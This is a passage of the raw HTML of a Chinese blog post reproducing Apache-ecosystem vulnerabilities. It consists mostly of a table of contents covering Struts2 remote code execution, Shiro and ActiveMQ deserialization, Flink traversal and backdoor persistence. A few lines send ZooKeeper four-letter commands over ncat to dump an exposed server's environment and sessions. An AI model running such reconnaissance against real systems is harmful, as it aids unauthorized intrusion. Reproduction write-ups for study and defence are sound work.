2、ruok：测试服务器是否运行在非错误状态。 echo ruok | ncat  2181 3、reqs：列出未完成的请求。 echo reqs | ncat  2181 4、envi：打印有关服务环境的详细信息。 echo envi | ncat  2181 5、dump：列出未完成的会话和临时节点。 echo dump | ncat  2181  本文链接：Apache漏洞复现 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","wordCount":"2104","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","author":{"@type":"Person","name":"0opsdc"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://examplesite.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},"publisher":{"@type":"Organization","name":"0opsdc","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://examplesite.com/ accesskey=h title="Home (Alt + H)">Home</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://examplesite.com/archives/ title=Archives>
+<span>Archives</span>
+</a>
+</li>
+<li>
+<a href=https://examplesite.com/tags/ title=Tags>
+<span>Tags</span>
+</a>
+</li>
+<li>
+<a href=https://examplesite.com/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://examplesite.com/>Home</a>&nbsp;»&nbsp;<a href=https://examplesite.com/post/>Posts</a></div>
+<h1 class=post-title>
+Apache漏洞复现
+</h1>
+<div class=post-meta>0opsdc
+</div>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#airflow-%e5%ad%98%e5%82%a8%e5%9e%8bxss aria-label="Airflow 存储型XSS">Airflow 存储型XSS</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#activemq-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-cve-2015-5254 aria-label="ActiveMQ 反序列化漏洞 CVE-2015-5254">ActiveMQ 反序列化漏洞 CVE-2015-5254</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-1 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-1 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#activemq-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e-cve-2016-3088 aria-label="ActiveMQ 任意文件写入漏洞 CVE-2016-3088">ActiveMQ 任意文件写入漏洞 CVE-2016-3088</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-2 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-2 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-1 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-2 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#ddos-cve-2007-6750 aria-label="DDOS CVE-2007-6750">DDOS CVE-2007-6750</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-3 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-3 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-2 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-3 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#httpd-%e5%a4%9a%e5%90%8e%e7%bc%80%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e aria-label="HTTPd 多后缀解析漏洞">HTTPd 多后缀解析漏洞</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-4 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-3 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-4 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#httpd-%e6%8d%a2%e8%a1%8c%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e-cve-2017-15715 aria-label="HTTPd 换行解析漏洞 CVE-2017-15715">HTTPd 换行解析漏洞 CVE-2017-15715</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-5 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-4 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-4 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-5 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#flink-%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86%e6%bc%8f%e6%b4%9e-cve-2020-17519 aria-label="Flink 目录遍历漏洞 CVE-2020-17519">Flink 目录遍历漏洞 CVE-2020-17519</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-6 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-5 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-5 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-6 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#%e5%90%8e%e9%97%a8%e7%bb%b4%e6%8c%81 aria-label=后门维持>后门维持</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-7 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-6 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-7 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#mod_jk-%e8%ae%bf%e9%97%ae%e6%8e%a7%e5%88%b6%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87-cve-2018-11759 aria-label="Mod_jk 访问控制权限绕过 CVE-2018-11759">Mod_jk 访问控制权限绕过 CVE-2018-11759</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-8 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-6 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-8 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#kylin-console-%e6%8e%a7%e5%88%b6%e5%8f%b0%e5%bc%b1%e5%8f%a3%e4%bb%a4 aria-label="Kylin Console 控制台弱口令">Kylin Console 控制台弱口令</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-9 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-7 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-9 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#kylin-%e6%9c%aa%e6%8e%88%e6%9d%83%e9%85%8d%e7%bd%ae%e6%b3%84%e9%9c%b2-cve-2020-13937 aria-label="Kylin 未授权配置泄露 CVE-2020-13937">Kylin 未授权配置泄露 CVE-2020-13937</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-10 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-8 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-10 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#rce-cve-2017-12615 aria-label="RCE CVE-2017-12615">RCE CVE-2017-12615</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-11 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-9 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-7 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-11 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#shiro-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-cve-2016-4437 aria-label="Shiro 反序列化漏洞 CVE-2016-4437">Shiro 反序列化漏洞 CVE-2016-4437</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-12 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-10 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-8 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-12 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-001-%e8%a1%a8%e5%8d%95%e9%aa%8c%e8%af%81%e9%94%99%e8%af%af%e8%bf%9c%e7%a8%8b%e5%88%a9%e7%94%a8-cve-2007-4556 aria-label="Struts2 S2-001 表单验证错误远程利用 CVE-2007-4556">Struts2 S2-001 表单验证错误远程利用 CVE-2007-4556</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-13 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-11 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-13 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-002-s-url%e5%92%8cs-a%e6%a0%87%e8%ae%b0%e4%b8%8a%e7%9a%84xss%e6%bc%8f%e6%b4%9e aria-label="Struts2 S2-002 &amp;lt;s: url&amp;gt;和&amp;lt;s: a&amp;gt;标记上的XSS漏洞">Struts2 S2-002 &lt;s: url>和&lt;s: a>标记上的XSS漏洞</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-14 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-12 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-14 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-003-xwork-parameterinterceptors%e6%97%81%e8%b7%af%e5%85%81%e8%ae%b8ognl%e8%af%ad%e5%8f%a5%e6%89%a7%e8%a1%8c-cve-2008-6504 aria-label="Struts2 S2-003 XWork ParameterInterceptors旁路允许OGNL语句执行 CVE-2008-6504">Struts2 S2-003 XWork ParameterInterceptors旁路允许OGNL语句执行 CVE-2008-6504</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-15 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-13 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-15 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-004-%e6%8f%90%e4%be%9b%e9%9d%99%e6%80%81%e5%86%85%e5%ae%b9%e6%97%b6%e7%9a%84%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86%e6%bc%8f%e6%b4%9e-cve-2008-6505 aria-label="Struts2 S2-004 提供静态内容时的目录遍历漏洞 CVE-2008-6505">Struts2 S2-004 提供静态内容时的目录遍历漏洞 CVE-2008-6505</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-16 aria-label=漏洞描述>漏洞描述</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-005-xwork-parameterinterceptors%e6%97%81%e8%b7%af%e5%85%81%e8%ae%b8rce aria-label="Struts2 S2-005 XWork ParameterInterceptors旁路允许RCE">Struts2 S2-005 XWork ParameterInterceptors旁路允许RCE</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-17 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-14 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-16 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-006-xwork%e7%9a%84%e5%a4%9a%e4%b8%aaxss%e7%94%9f%e6%88%90%e9%94%99%e8%af%af%e9%a1%b5%e9%9d%a2 aria-label="Struts2 S2-006 XWork的多个XSS生成错误页面">Struts2 S2-006 XWork的多个XSS生成错误页面</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-18 aria-label=漏洞描述>漏洞描述</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-007-%e5%87%ba%e7%8e%b0%e8%bd%ac%e6%8d%a2%e9%94%99%e8%af%af%e6%97%b6%e7%94%a8%e6%88%b7%e8%be%93%e5%85%a5%e8%a2%ab%e8%af%84%e4%bc%b0%e4%b8%baognl%e8%a1%a8%e8%be%be%e5%bc%8f-cve-2012-0838 aria-label="Struts2 S2-007 出现转换错误时，用户输入被评估为OGNL表达式 CVE-2012-0838">Struts2 S2-007 出现转换错误时，用户输入被评估为OGNL表达式 CVE-2012-0838</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-19 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-15 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-17 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#structs2-s2-008-struts2%e4%b8%ad%e7%9a%84%e5%a4%9a%e4%b8%aa%e5%85%b3%e9%94%ae%e6%bc%8f%e6%b4%9e-cve-2012-0391 aria-label="Structs2 S2-008 Struts2中的多个关键漏洞 CVE-2012-0391">Structs2 S2-008 Struts2中的多个关键漏洞 CVE-2012-0391</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-20 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-16 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-9 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-18 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-009-parameterintercetptor%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e aria-label="Struts2 S2-009 ParameterIntercetptor远程命令执行漏洞">Struts2 S2-009 ParameterIntercetptor远程命令执行漏洞</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-21 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-17 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-19 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts-s2-010-%e4%bd%bf%e7%94%a8struts2%e4%bb%a4%e7%89%8c%e6%9c%ba%e5%88%b6%e8%bf%9b%e8%a1%8ccsrf%e4%bf%9d%e6%8a%a4%e6%97%b6%e5%8f%af%e8%83%bd%e4%bc%9a%e5%9b%a0%e6%bb%a5%e7%94%a8%e5%b7%b2%e7%9f%a5%e4%bc%9a%e8%af%9d%e5%b1%9e%e6%80%a7%e7%bb%95%e8%bf%87%e6%a3%80%e6%9f%a5 aria-label="Struts S2-010 使用Struts2令牌机制进行CSRF保护时，可能会因滥用已知会话属性绕过检查">Struts S2-010 使用Struts2令牌机制进行CSRF保护时，可能会因滥用已知会话属性绕过检查</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-22 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-18 aria-label=影响版本>影响版本</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-011-%e9%95%bf%e8%af%b7%e6%b1%82%e5%8f%82%e6%95%b0%e5%90%8d%e7%a7%b0%e5%8f%af%e8%83%bd%e4%bc%9a%e6%98%be%e8%91%97%e6%8f%90%e9%ab%98dos%e6%94%bb%e5%87%bb%e6%9c%89%e6%95%88%e6%80%a7 aria-label="Struts2 S2-011 长请求参数名称可能会显著提高DOS攻击有效性">Struts2 S2-011 长请求参数名称可能会显著提高DOS攻击有效性</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-23 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-19 aria-label=影响版本>影响版本</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-012-%e5%b1%95%e7%a4%ba%e5%ba%94%e7%94%a8%e7%a8%8b%e5%ba%8f%e6%bc%8f%e6%b4%9e%e5%85%81%e8%ae%b8%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c-cve-2013-1965 aria-label="Struts2 S2-012 展示应用程序漏洞允许远程命令执行 CVE-2013-1965">Struts2 S2-012 展示应用程序漏洞允许远程命令执行 CVE-2013-1965</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-24 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-20 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-20 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-013-url%e5%92%8c%e9%94%9a%e6%a0%87%e8%ae%b0%e7%9a%84includeparams%e5%b1%9e%e6%80%a7%e4%b8%ad%e5%ad%98%e5%9c%a8%e7%9a%84%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e-cve-2013-1966 aria-label="Struts2 S2-013 URL和锚标记的includeParams属性中存在的远程命令执行漏洞 CVE-2013-1966">Struts2 S2-013 URL和锚标记的includeParams属性中存在的远程命令执行漏洞 CVE-2013-1966</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-25 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-21 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-21 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-014-%e5%bc%ba%e5%88%b6%e5%8f%82%e6%95%b0%e5%8c%85%e5%90%ab%e5%9c%a8url%e5%92%8c%e9%94%9a%e6%a0%87%e8%ae%b0%e4%b8%ad%e5%bc%95%e5%85%a5%e7%9a%84%e6%bc%8f%e6%b4%9e%e5%85%81%e8%ae%b8%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e4%bc%9a%e8%af%9d%e8%ae%bf%e9%97%ae%e6%93%8d%e4%bd%9c%e5%8f%8axss%e6%94%bb%e5%87%bb-cve-2013-1966-cve-2013-2115 aria-label="Struts2 S2-014 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行、会话访问操作及XSS攻击 CVE-2013-1966 CVE-2013-2115">Struts2 S2-014 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行、会话访问操作及XSS攻击 CVE-2013-1966 CVE-2013-2115</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-26 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-22 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-22 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-015-%e9%80%9a%e9%85%8d%e7%ac%a6%e5%8c%b9%e9%85%8d%e6%9c%ba%e5%88%b6%e5%bc%95%e5%85%a5%e7%9a%84%e6%bc%8f%e6%b4%9e%e6%88%96ognl%e8%a1%a8%e8%be%be%e5%bc%8f%e7%9a%84%e5%8f%8c%e9%87%8d%e8%af%84%e4%bc%b0%e5%af%bc%e8%87%b4%e7%9a%84%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e-cve-2013-2134-cve-2013-2135 aria-label="Struts2 S2-015 通配符匹配机制引入的漏洞或OGNL表达式的双重评估导致的远程命令执行漏洞 CVE-2013-2134 CVE-2013-2135">Struts2 S2-015 通配符匹配机制引入的漏洞或OGNL表达式的双重评估导致的远程命令执行漏洞 CVE-2013-2134 CVE-2013-2135</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-27 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-23 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-23 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-016-%e9%80%9a%e8%bf%87%e6%93%8d%e4%bd%9c%e5%89%8d%e7%bc%80actionredirectredirectaction%e5%8f%82%e6%95%b0%e9%80%a0%e6%88%90%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e-cve-2013-2251 aria-label="Struts2 S2-016 通过操作前缀action:、redirect:、redirectAction:参数造成远程命令执行漏洞 CVE-2013-2251">Struts2 S2-016 通过操作前缀<code>action:</code>、<code>redirect:</code>、<code>redirectAction:</code>参数造成远程命令执行漏洞 CVE-2013-2251</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-28 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-24 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-24 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-017-%e9%80%9a%e8%bf%87%e6%93%8d%e4%bd%9c%e5%89%8d%e7%bc%80redirectredirectaction%e5%8f%82%e6%95%b0%e5%bc%95%e5%85%a5%e6%bc%8f%e6%b4%9e%e5%85%81%e8%ae%b8%e6%89%93%e5%bc%80%e9%87%8d%e5%ae%9a%e5%90%91-cve-2013-2248 aria-label="Struts2 S2-017 通过操作前缀redirect:、redirectAction:参数引入漏洞允许打开重定向 CVE-2013-2248">Struts2 S2-017 通过操作前缀<code>redirect:</code>、<code>redirectAction:</code>参数引入漏洞允许打开重定向 CVE-2013-2248</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-29 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-25 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-25 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-018-%e8%ae%bf%e9%97%ae%e6%8e%a7%e5%88%b6%e6%bc%8f%e6%b4%9e aria-label="Struts2 S2-018 访问控制漏洞">Struts2 S2-018 访问控制漏洞</a></li>
+<li>
+<a href=#struts2-s2-019-%e9%bb%98%e8%ae%a4%e6%83%85%e5%86%b5%e4%b8%8b%e7%a6%81%e7%94%a8%e5%8a%a8%e6%80%81%e6%96%b9%e6%b3%95%e8%b0%83%e7%94%a8-cve-2016-0785 aria-label="Struts2 S2-019 默认情况下禁用动态方法调用 CVE-2016-0785">Struts2 S2-019 默认情况下禁用动态方法调用 CVE-2016-0785</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-30 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%bd%b1%e5%93%8d aria-label=漏洞影响>漏洞影响</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-26 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
